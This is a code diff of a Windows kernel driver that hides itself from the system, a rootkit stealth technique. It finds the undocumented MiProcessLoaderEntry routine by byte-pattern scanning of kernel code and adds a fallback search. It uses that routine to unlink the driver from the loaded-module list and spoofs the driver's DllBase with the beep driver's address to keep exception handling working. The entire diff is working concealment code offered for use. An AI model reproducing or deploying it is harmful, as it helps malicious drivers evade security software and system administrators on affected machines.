@@ -1,10 +1,35 @@
-#include "HideDiver.h"
+#include "pch.h"
 
 #pragma warning(disable : 4047)  
+
+typedef struct _LDR_DATA_TABLE_ENTRY
+{
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID      DllBase;
+    PVOID      EntryPoint;
+}LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
 
 typedef NTSTATUS(__fastcall *MiProcessLoaderEntry)(PVOID pDriverSection, int bLoad);
 
 MiProcessLoaderEntry g_pfnMiProcessLoaderEntry = NULL;
+
+NTSYSAPI
+NTSTATUS
+NTAPI
+ObReferenceObjectByName(
+    __in PUNICODE_STRING ObjectName,
+    __in ULONG Attributes,
+    __in_opt PACCESS_STATE AccessState,
+    __in_opt ACCESS_MASK DesiredAccess,
+    __in POBJECT_TYPE ObjectType,
+    __in KPROCESSOR_MODE AccessMode,
+    __inout_opt PVOID ParseContext,
+    __out PVOID* Object
+);
+
+extern POBJECT_TYPE *IoDriverObjectType;
 
 PVOID GetCallPoint(PVOID pCallPoint)
 {
@@ -76,7 +101,7 @@ PVOID GetUndocumentFunctionAddress(IN PUNICODE_STRING pFunName, IN PUCHAR pStart
                 dwCodeNum++;
 
                 if (dwCodeNum == FeatureCodeNum)
-                    return pFunAddress + dwIndex - dwCodeNum + 1 + AddNum;
+                    return pFunAddress + dwIndex - dwCodeNum + 1 + (int)AddNum;
 
                 continue;
             }
@@ -90,6 +115,39 @@ PVOID GetUndocumentFunctionAddress(IN PUNICODE_STRING pFunName, IN PUCHAR pStart
     }
 
     return 0;
+}
+
+NTSTATUS GetDriverObject(PDRIVER_OBJECT *lpObj, WCHAR* DriverDirName)
+{
+    NTSTATUS status = STATUS_SUCCESS;
+    PDRIVER_OBJECT pBeepObj = NULL;
+    UNICODE_STRING DevName = { 0 };
+
+    if (!MmIsAddressValid(lpObj))
+        return STATUS_INVALID_ADDRESS;
+
+    RtlInitUnicodeString(&DevName, DriverDirName);
+
+    status = ObReferenceObjectByName(&DevName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, &pBeepObj);
+
+    if (NT_SUCCESS(status))
+        *lpObj = pBeepObj;
+    else
+    {
+        DPRINT("Get Obj faild...error:0x%x\n", status);
+    }
+
+    return status;
+}
+
+void SupportSEH(PDRIVER_OBJECT pDriverObject)
+{
+    PDRIVER_OBJECT pTempDrvObj = NULL;
+    PLDR_DATA_TABLE_ENTRY ldr = pDriverObject->DriverSection;
+    if (NT_SUCCESS(GetDriverObject(&pTempDrvObj, L"\\Driver\\beep")))
+    {
+        ldr->DllBase = pTempDrvObj->DriverStart;
+    }
 }
 
 BOOLEAN HideDriverWin7(PDRIVER_OBJECT pTargetDriverObject)
@@ -137,9 +195,10 @@ MiProcessSuccess:
 
     g_pfnMiProcessLoaderEntry = pMiProcessLoaderEntry;
 
-    DbgPrint("0x%p\n", g_pfnMiProcessLoaderEntry);
+    DPRINT("0x%p\n", g_pfnMiProcessLoaderEntry);
 
     /*////////////////////////////////Òþ²ØÇý¶¯/////////////////////////////////*/
+    SupportSEH(pTargetDriverObject);
     g_pfnMiProcessLoaderEntry(pTargetDriverObject->DriverSection, 0);
 
     pTargetDriverObject->DriverSection = NULL;
@@ -160,18 +219,22 @@ NTSTATUS HideDriverWin10(PDRIVER_OBJECT pTargetDriverObject)
 {
     UNICODE_STRING usRoutie = { 0 };
     PUCHAR pAddress = NULL;
+    PUCHAR pMiUnloadSystemImage = NULL;
 
     UCHAR code[3] =
         "\xD8\xE8";
 
     UCHAR code2[10] =
-        "\x48\x8B\xCB\xE8\x60\x60\x60\x60\x8B";
+        "\x48\x8B\xD8\xE8\x60\x60\x60\x60\x8B";
+
+    UCHAR code3[3] =
+        "\xA8\x04";
 
     /*
     PAGE:000000014052ABE4 48 8B D8                                      mov     rbx, rax
     PAGE:000000014052ABE7 E8 48 17 F7 FF                                call    MiUnloadSystemImage
     */
-
+    DbgBreakPoint();
     if (pTargetDriverObject == NULL)
         return STATUS_INVALID_PARAMETER;
 
@@ -181,7 +244,7 @@ NTSTATUS HideDriverWin10(PDRIVER_OBJECT pTargetDriverObject)
 
     if (pAddress == NULL)
     {
-        DbgPrint("MiUnloadSystemImage 1 faild!\n");
+        DPRINT("MiUnloadSystemImage 1 faild!\n");
         return STATUS_UNSUCCESSFUL;
     }
 
@@ -189,10 +252,10 @@ NTSTATUS HideDriverWin10(PDRIVER_OBJECT pTargetDriverObject)
 
     if (pAddress == NULL)
     {
-        DbgPrint("MiUnloadSystemImage 2 faild!\n");
+        DPRINT("MiUnloadSystemImage 2 faild!\n");
         return STATUS_UNSUCCESSFUL;
     }
-
+    pMiUnloadSystemImage = pAddress;
     /*
     PAGE:000000014049C5CF 48 8B CB                                      mov     rcx, rbx
     PAGE:000000014049C5D2 E8 31 29 C2 FF                                call    MiProcessLoaderEntry
@@ -204,23 +267,27 @@ NTSTATUS HideDriverWin10(PDRIVER_OBJECT pTargetDriverObject)
 
     if (pAddress == NULL)
     {
-        DbgPrint("MiProcessLoaderEntry 1 faild!\n");
-        return STATUS_UNSUCCESSFUL;
+        DPRINT("MiProcessLoaderEntry 1 faild!\n");
+        pAddress = GetUndocumentFunctionAddress(NULL, pMiUnloadSystemImage, code3, 2, 0x300, 0x60, -11, FALSE);
+        DbgBreakPoint();
+        if(pAddress == NULL)
+            return STATUS_UNSUCCESSFUL;
     }
 
     g_pfnMiProcessLoaderEntry = (MiProcessLoaderEntry)GetCallPoint(pAddress);
 
     if (g_pfnMiProcessLoaderEntry == NULL)
     {
-        DbgPrint("MiProcessLoaderEntry 2 faild!\n");
+        DPRINT("MiProcessLoaderEntry 2 faild!\n");
         return STATUS_UNSUCCESSFUL;
     }
 
     //DbgBreakPoint();
 
-    DbgPrint("0x%p\n", g_pfnMiProcessLoaderEntry);
+    DPRINT("0x%p\n", g_pfnMiProcessLoaderEntry);
 
     /*////////////////////////////////Òþ²ØÇý¶¯/////////////////////////////////*/
+    SupportSEH(pTargetDriverObject);
     g_pfnMiProcessLoaderEntry(pTargetDriverObject->DriverSection, 0);
 
     pTargetDriverObject->DriverSection = NULL;
@@ -235,3 +302,4 @@ NTSTATUS HideDriverWin10(PDRIVER_OBJECT pTargetDriverObject)
 
     return STATUS_SUCCESS;
 }
+
